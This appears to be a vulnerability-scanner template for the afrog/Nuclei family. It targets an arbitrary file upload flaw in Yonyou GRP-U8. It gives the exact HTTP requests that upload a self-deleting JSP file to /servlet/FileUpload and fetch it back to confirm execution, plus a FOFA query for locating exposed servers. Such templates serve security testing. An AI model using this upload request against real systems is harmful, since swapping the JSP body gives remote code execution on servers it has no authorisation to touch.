id: yonyou-grp-u8-fileupload

info:
  name: 用友 GRP-U8 FileUpload 任意文件上传
  author: zan8in
  severity: critical
  description: |
    用友 GRP-U8 /servlet/FileUpload 存在任意文件上传，上传后可在 /R9iPortal/upload/ 访问。与 UploadFileData 不是同一接口。属 GRP-U8。
  reference:
    - https://github.com/zan8in/afrog
  metadata:
    verified: true
    max-request: 2
    fofa-query: title="用友GRP-U8"
  tags: yonyou,grp-u8,fileupload,intrusive

variables:
  filename: "{{rand_base(8)}}"
  marker: "{{rand_base(18)}}"

http:
  - raw:
      - |
        POST /servlet/FileUpload?fileName={{filename}}.jsp&actionID=update HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream

        <% out.println("{{marker}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
      - |
        GET /R9iPortal/upload/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2, '{{marker}}')"
        condition: and
